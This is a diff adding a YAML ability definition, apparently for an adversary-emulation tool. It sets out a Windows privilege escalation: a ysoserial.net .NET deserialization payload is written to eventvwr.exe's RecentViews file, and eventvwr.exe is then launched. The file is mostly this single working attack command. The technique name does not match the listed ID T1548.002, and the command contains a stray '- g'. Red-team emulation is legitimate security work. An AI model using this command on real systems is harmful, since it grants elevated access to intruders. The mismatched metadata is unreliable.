@@ -1,0 +1,26 @@
+- id: 9c17908e-6bb3-333e-36cc-9b3e5d8d680b
+  name: Eventvwr.exe - During startup, eventvwr.exe uses .NET deserialization with
+    %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews file. This file can be created using
+    https://github.com/pwntester/ysoserial.net
+  description: During startup, eventvwr.exe uses .NET deserialization with %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews
+    file. This file can be created using https://github.com/pwntester/ysoserial.net
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "#{host.executable.name}"
+          > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews
+          & eventvwr.exe
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - privilege-escalation
+  version: '1.0'
+  author: Jacob Gajek
+  created: '2018-11-01'
+  modified: '2018-11-01'
+  operating_system: Windows All Versions
